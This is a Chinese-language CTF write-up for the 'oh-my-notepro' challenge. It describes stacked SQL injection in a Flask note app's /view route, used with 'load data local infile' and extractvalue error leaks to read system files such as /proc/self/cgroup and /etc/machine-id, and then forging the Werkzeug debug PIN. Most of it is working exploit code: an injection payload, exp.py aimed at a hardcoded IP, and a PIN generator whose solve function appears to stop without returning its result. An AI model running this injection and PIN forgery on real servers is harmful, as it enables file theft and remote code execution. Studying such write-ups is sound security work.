# oh-my-notepro-ZH

打开题目，在完成登录以后，发现是一个note记录板，每个登录用户可以发送note到自己账目下，尝试访问异常的url以后会发现有flask debug信息，直观感觉是一个pin码构造的题目，先得找寻可以任意文件读的地方。

访问`/view`路由以后，在debug报错中发现代码

```
result = db.session.execute(sql,params={"multi":True})
```

可知此处表明存在堆叠注入的可能，猜测是MySQL的堆叠注入读取文件，并同时利用debug信息的报错返回可以读取本地文件，利用`load_file`结合debug信息返回配合报错注入可以读取到`/etc/passwd`，但尝试根据pin码伪造需要的文件名信息进行读取时，发现无法读到对应文件内容，此处和`load_file`的使用特性有关，`load_file`无法成功读取一些涉及系统信息的文件，改用`load data infile`来读取，发现能读到涉及MAC等pin码伪造的必要信息，但开始构造pin码时并不能计算出正常的pin码，原因有两点：


* MySQL服务和Web服务分属两个不同的容器，使用`load data infile`读取到的是MySQL容器的文件信息，该文件信息并不是Web服务的运行环境信息，所以应该使用`load data local infile`来读取Web服务的文件信息来构造pin码，参考POC如下

```
view?note_id=';CREATE TABLE IF NOT EXISTS {tmp_database}(cmd text);Load data local infile '{file}' into table {tmp_database};select * from users where username=1 and (extractvalue(1,concat(0x7e,(select substr((select group_concat(cmd) from {tmp_database}),{str(z)},{str(20)})),0x7e)));
```


* 通过翻阅源码可知，Werkzeug的更新给pin码的计算方式带来了变化`https://github.com/pallets/werkzeug/commit/617309a7c317ae1ade428de48f5bc4a906c2950f`，直接使用网上大多数的pin码计算方式并不能计算出当前环境下正确的pin码，主要有两个变化，一个是修改以前是读取`/proc/self/cgroup、/etc/machine-id、/proc/sys/kernel/random/boot_id`这三个文件，读取到一个文件的内容，直接返回，新版本是从`/etc/machine-id、/proc/sys/kernel/random/boot_id`中读到一个值后立即break，然后和`/proc/self/cgroup`中的id值拼接，使用拼接的值来计算pin码；二一个变化是h的计算从md5变为了使用sha1，所以计算pin码的POC也要进行相应的调整，此外输入正确的pin码以后大概率会出现404等错误，可以通过清理网站缓存然后开启一个新的无痕会话来解决这个问题。

参考POC如下

```
# exp.py

import requests
import re
import string
import random
from pin import solve

def get_content(file, regexp):
    ans = ''
    z = 1
    while True:
        try:
            tmp_database = get_random_id()
            path = f"view?note_id=';CREATE TABLE IF NOT EXISTS {tmp_database}(cmd text);Load data local infile '{file}' into table {tmp_database};select * from users where username=1 and (extractvalue(1,concat(0x7e,(select substr((select group_concat(cmd) from {tmp_database}),{str(z)},{str(20)})),0x7e)));"
            view_url = base_url + path
            r = s.get(url=view_url)
            content = re.findall("'~(.*?)'", r.text)[0]
            if content[0] == '~':
                break
            ans += content[:-1]
            if content[-1] != '~':
                break
            z += 20
            print(ans)
            
        except Exception as e:
            print(e)
            break
    k = re.findall(regexp, ans)[0]
    print('k is: ', k)
    return k

def get_random_id():
    alphabet = list(string.ascii_lowercase + string.digits)
    return ''.join([random.choice(alphabet) for _ in range(32)])

base_url = 'http://localhost:5002/'
base_url = 'http://124.223.208.221:5002/'
s = requests.session()

login_data = {
    'username': "veererere",
    'password': "fefefef"
}
proxies = {
    'http': 'http://127.0.0.1:8080'
}
login_url = base_url + 'login'
r = s.post(url=login_url, data=login_data, proxies=proxies)

cgroup = get_content('/proc/self/cgroup', 'docker/(.*?),')
machine_id = get_content('/etc/machine-id', '(.*)')
eth0 = get_content('/sys/class/net/eth0/address', '(.*)')

eth0 = str(int(eth0.replace(':',''),16))

print("eth0 is: ", eth0)
print("machine_id is: ", machine_id)
print("cgroup is: ", cgroup)
solve('ctf', eth0, machine_id, cgroup)

```

```
# pin.py

import hashlib
from itertools import chain

def solve(username, eth0, machine_id, cgroup):
    probably_public_bits = [
    username,# username ok
    'flask.app', # ok
    'Flask' #ok,
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # ok
]

    private_bits = [
        eth0,# /sys/class/net/eth0/address
        machine_id + cgroup
        # '7cb84391-1303-4564-8eff-ef7571804198327e92627edf30f63fde916e3c3017aea76eeb876265a726270a575d391eeb4a'# machine-id
        # /etc/machine-id + /proc/self/cgroup
    ]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                            for x in range(0, len(num), group_size))
                break
        else:
            rv = num
```